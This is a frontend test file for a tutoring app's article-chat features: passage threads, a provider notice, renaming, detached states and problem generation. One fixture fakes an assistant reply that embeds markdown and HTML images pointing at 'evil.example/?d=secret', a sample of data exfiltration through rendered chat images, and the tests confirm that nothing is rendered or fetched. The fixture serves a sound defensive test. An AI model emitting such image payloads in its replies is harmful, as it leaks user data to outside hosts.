// @vitest-environment jsdom
/**
 * Chats on passages in the Library page (T24, SPEC §15.5, §15.6): Ask about
 * this on a selection and beside headings, the one-time provider notice,
 * the thread list and margin markers, rename, reset, detached and
 * file-missing states, and chat messages that never render images. The
 * tutor is the fake bridge; nothing calls an AI provider.
 */
import { cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { ArticleThreadView } from '../../../../shared/article-chat';
import type { ArticleView, TreeView } from '../../../../shared/library';
import { ChatStore, ChatStoreContext } from '../../chat/store';
import { MessageView } from '../../chat/MessageView';
import { Toasts } from '../../components/Toasts';
import { AppProvider } from '../../lib/app';
import { LibraryPage } from '../../pages/LibraryPage';
import { FakeBridge, installBridge } from '../../test/fake-bridge';
import { baseHandlers, TUTOR_OFF, TUTOR_ON } from '../../test/fixtures';

const ID = 'article:12345678-1234-4234-8234-123456789abc';
const TREE: TreeView = {
  folders: [
    {
      id: 'f1',
      name: 'Vault',
      error: null,
      root: {
        name: '',
        folders: [],
        articles: [{ id: 'a1', title: 'Heaps', tags: [], missing: false }],
      },
    },
  ],
};
const ARTICLE: ArticleView = {
  id: 'a1',
  title: 'Heaps',
  source: null,
  author: [],
  published: null,
  created: null,
  description: null,
  tags: [],
  extra: [],
  missing: false,
  generated: false,
  body: '# Heaps\n\nA heap keeps the smallest item on top.\n\n## Uses\n\nPriority queues use heaps.\n',
  images: {},
  links: {},
};
const SECRET_IMAGE =
  'Look: ![x](https://evil.example/?d=secret) and <img src="https://evil.example/2">';

let threads: ArticleThreadView[];
let seen: boolean;
let store: ChatStore;
let fetchSpy: ReturnType<typeof vi.fn>;

beforeEach(() => {
  window.location.hash = '#/library/a1';
  threads = [];
  seen = false;
  store = new ChatStore();
  fetchSpy = vi.fn(() => Promise.reject(new Error('network unavailable')));
  vi.stubGlobal('fetch', fetchSpy);
  vi.spyOn(window, 'confirm').mockReturnValue(true);
});

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

function setup(opts: { tutor?: typeof TUTOR_ON; article?: ArticleView } = {}) {
  const bridge = baseHandlers(new FakeBridge())
    .on('tutor:status', () => opts.tutor ?? TUTOR_ON)
    .on('library:tree', () => TREE)
    .on('library:article', () => opts.article ?? ARTICLE)
    .on('library:threads', ({ article }) => ({ article, threads }))
    .on('library:thread-create', ({ anchor }) => {
      threads.push({
        id: ID,
        title: null,
        anchor,
        created_at: '2026-11-20T10:00:00Z',
        last_at: null,
        messages: 0,
      });
      return { thread: ID };
    })
    .on('library:thread-rename', ({ thread, title }) => {
      threads = threads.map((t) => (t.id === thread ? { ...t, title } : t));
      return { thread, title };
    })
    .on('library:chat-notice', ({ ack }) => {
      if (ack) seen = true;
      return { seen };
    })
    .on('chat:reset', ({ thread }) => ({ thread, archived: true }));
  installBridge(bridge);
  const view = render(
    <AppProvider>
      <ChatStoreContext.Provider value={store}>
        <LibraryPage article="a1" />
        <Toasts />
      </ChatStoreContext.Provider>
    </AppProvider>,
  );
  return { bridge, view };
}

const body = () => document.querySelector('.article-body') as HTMLElement;
const pane = () => within(screen.getByTestId('article-chats'));

function select(text: string): void {
  const el = body();
  const walker = document.createTreeWalker(el, NodeFilter.SHOW_TEXT);
  for (let n = walker.nextNode(); n; n = walker.nextNode()) {
    const t = n as Text;
    const at = t.data.indexOf(text);
    if (at < 0) continue;
    const r = document.createRange();
    r.setStart(t, at);
    r.setEnd(t, at + text.length);
    const sel = window.getSelection()!;
    sel.removeAllRanges();
    sel.addRange(r);
    fireEvent.mouseUp(el);
    return;
  }
  throw new Error(`no text ${text}`);
}

describe('chats on passages', () => {
  it('Ask about this → notice once → the thread is created and the question sent', async () => {
    const { bridge } = setup();
    await screen.findByRole('article', { name: 'Heaps' });
    expect(await screen.findByTestId('no-chats')).toBeTruthy();

    select('smallest item on top');
    fireEvent.click(await screen.findByRole('button', { name: 'Ask about this' }));
    expect(pane().getByTestId('passage-quote').textContent).toBe('smallest item on top');

    fireEvent.change(pane().getByRole('textbox', { name: 'Message the tutor' }), {
      target: { value: 'Why on top?' },
    });
    fireEvent.click(pane().getByRole('button', { name: 'Send' }));
    // The one-time notice first; nothing is created or sent yet.
    expect(await screen.findByTestId('provider-notice')).toBeTruthy();
    expect(bridge.channels()).not.toContain('library:thread-create');
    fireEvent.click(
      within(screen.getByTestId('provider-notice')).getByRole('button', { name: 'Send' }),
    );

    await waitFor(() => expect(bridge.streams.some((s) => s.channel === 'chat:send')).toBe(true));
    const create = bridge.calls.find((c) => c.channel === 'library:thread-create')!;
    expect(create.request).toEqual({
      article: 'a1',
      anchor: {
        kind: 'quote',
        heading: ['Heaps'],
        quote: 'smallest item on top',
        prefix: 'Heaps A heap keeps the ',
        suffix: '. Uses Priority queues use heaps',
      },
    });
    expect(seen).toBe(true);
    const s = bridge.streams.find((x) => x.channel === 'chat:send')!;
    expect(s.request).toEqual({ thread: ID, text: 'Why on top?' });
    s.emit({ type: 'text_delta', text: SECRET_IMAGE });
    s.emit({ type: 'done', stop: 'end_turn' });
    s.finish({
      message: { seq: 2, role: 'assistant', text: SECRET_IMAGE, stop: 'end_turn', created_at: 't' },
    });
    const reply = await screen.findByTestId('msg-assistant');
    await waitFor(() => expect(reply.textContent).toContain('Look:'));
    // Never an image in a chat, so nothing is fetched.
    expect(screen.getByTestId('article-chats').querySelector('img')).toBeNull();
    expect(fetchSpy).not.toHaveBeenCalled();

    // The thread is listed and marked in the margin.
    await waitFor(() => expect(screen.getAllByTestId('passage-marker')).toHaveLength(1));
    expect(pane().getByText('smallest item on top', { selector: '.thread-snippet' })).toBeTruthy();

    // A second message does not show the notice again.
    fireEvent.change(pane().getByRole('textbox', { name: 'Message the tutor' }), {
      target: { value: 'And again?' },
    });
    fireEvent.click(pane().getByRole('button', { name: 'Send' }));
    await waitFor(() =>
      expect(bridge.streams.filter((x) => x.channel === 'chat:send')).toHaveLength(2),
    );
    expect(screen.queryByTestId('provider-notice')).toBeNull();
  });

  it('a heading button asks about its section', async () => {
    seen = true;
    setup();
    await screen.findByRole('article', { name: 'Heaps' });
    fireEvent.click(await screen.findByRole('button', { name: 'Ask about the section “Uses”' }));
    expect(pane().getByTestId('passage-quote').textContent).toBe('Section: Heaps › Uses');
  });

  it('lists threads with title and snippet, renames, resets, and shows detached ones', async () => {
    seen = true;
    threads = [
      {
        id: ID,
        title: 'Why on top?',
        anchor: {
          kind: 'quote',
          heading: ['Heaps'],
          quote: 'smallest item on top',
          prefix: '',
          suffix: '',
        },
        created_at: '2026-11-20T10:00:00Z',
        last_at: '2026-11-20T10:01:00Z',
        messages: 2,
      },
      {
        id: 'article:12345678-1234-4234-8234-0000000000ff',
        title: 'Gone passage',
        anchor: {
          kind: 'quote',
          heading: ['Removed'],
          quote: 'no longer here',
          prefix: '',
          suffix: '',
        },
        created_at: '2026-11-20T09:00:00Z',
        last_at: null,
        messages: 2,
      },
    ];
    const { bridge } = setup();
    await screen.findByRole('article', { name: 'Heaps' });
    await waitFor(() => expect(screen.getAllByTestId('passage-marker')).toHaveLength(1));
    expect(pane().getByText('detached')).toBeTruthy();

    fireEvent.click(pane().getByText('Gone passage'));
    expect(await pane().findByTestId('thread-detached')).toBeTruthy();

    fireEvent.click(screen.getByTestId('passage-marker'));
    expect(pane().queryByTestId('thread-detached')).toBeNull();
    fireEvent.click(pane().getByRole('button', { name: 'Rename' }));
    const input = pane().getByRole('textbox', { name: 'Chat title' });
    fireEvent.change(input, { target: { value: 'Heap order' } });
    fireEvent.submit(input.closest('form')!);
    await waitFor(() => expect(pane().getAllByText('Heap order').length).toBeGreaterThan(0));
    expect(bridge.calls.find((c) => c.channel === 'library:thread-rename')!.request).toEqual({
      thread: ID,
      title: 'Heap order',
    });
  });

  it('reads existing chats with the tutor off; a missing file says so', async () => {
    threads = [
      {
        id: ID,
        title: 'Why on top?',
        anchor: { kind: 'heading', heading: ['Heaps'], quote: '', prefix: '', suffix: '' },
        created_at: '2026-11-20T10:00:00Z',
        last_at: null,
        messages: 0,
      },
    ];
    setup({ tutor: TUTOR_OFF, article: { ...ARTICLE, missing: true, body: '' } });
    expect(await screen.findByTestId('chat-file-missing')).toBeTruthy();
    fireEvent.click(await pane().findByText('Why on top?'));
    expect(await pane().findByTestId('ai-unavailable')).toBeTruthy();
    expect(pane().getByRole('button', { name: 'Send' }).hasAttribute('disabled')).toBe(true);
  });
});

describe('chat messages never render images', () => {
  it('in article and problem threads alike (one renderer)', () => {
    for (const thread of [ID, 'pair-with-target']) {
      const { container, unmount } = render(
        <MessageView
          message={{
            id: `m-${thread}`,
            role: 'assistant',
            text: '',
            parts: [{ kind: 'text', text: SECRET_IMAGE }],
          }}
        />,
      );
      expect(container.querySelector('img')).toBeNull();
      expect(container.innerHTML).not.toContain('evil.example/?d=secret"');
      unmount();
    }
    expect(fetchSpy).not.toHaveBeenCalled();
  });
});

describe('T25: problems from a passage and articles the tutor writes', () => {
  it('Make a problem from this sends the request; a passing problem offers Open in Practice', async () => {
    seen = true;
    const { bridge } = setup();
    await screen.findByRole('article', { name: 'Heaps' });
    select('smallest item on top');
    fireEvent.click(await screen.findByRole('button', { name: 'Ask about this' }));
    fireEvent.click(pane().getByTestId('make-problem'));
    await waitFor(() => expect(bridge.streams.some((s) => s.channel === 'chat:send')).toBe(true));
    const s = bridge.streams.find((x) => x.channel === 'chat:send')!;
    expect(s.request).toEqual({ thread: ID, text: 'Make a practice problem from this passage.' });
    s.emit({ type: 'ui_event', event: { type: 'ui', action: 'open_problem', slug: 'even-count' } });
    s.emit({ type: 'done', stop: 'end_turn' });
    s.finish({
      message: { seq: 2, role: 'assistant', text: 'Ready.', stop: 'end_turn', created_at: 't' },
    });
    const note = await screen.findByTestId('passage-problem');
    expect(note.textContent).toContain('even-count');
    // Not opened by itself: the user stays on the article.
    expect(window.location.hash).toBe('#/library/a1');
    fireEvent.click(within(note).getByRole('button', { name: 'Open in Practice' }));
    expect(window.location.hash).toBe('#/p/even-count');
  });

  it('a generated article is labelled AI-written; Write an article opens the new one', async () => {
    const { bridge } = setup({ article: { ...ARTICLE, generated: true } });
    bridge.on('library:write-article', () => ({ id: 'g1', title: 'Tries' }));
    expect(await screen.findByTestId('ai-written')).toBeTruthy();
    fireEvent.click(screen.getByRole('button', { name: 'Write an article' }));
    const form = within(screen.getByRole('form', { name: 'Write an article' }));
    fireEvent.change(form.getByRole('textbox', { name: 'Topic' }), { target: { value: 'Tries' } });
    fireEvent.change(form.getByRole('combobox', { name: 'Level' }), {
      target: { value: 'beginner' },
    });
    fireEvent.click(form.getByRole('button', { name: 'Write' }));
    await waitFor(() => expect(window.location.hash).toBe('#/library/g1'));
    expect(bridge.calls.find((c) => c.channel === 'library:write-article')!.request).toEqual({
      topic: 'Tries',
      level: 'beginner',
      length: 'medium',
    });
  });
});
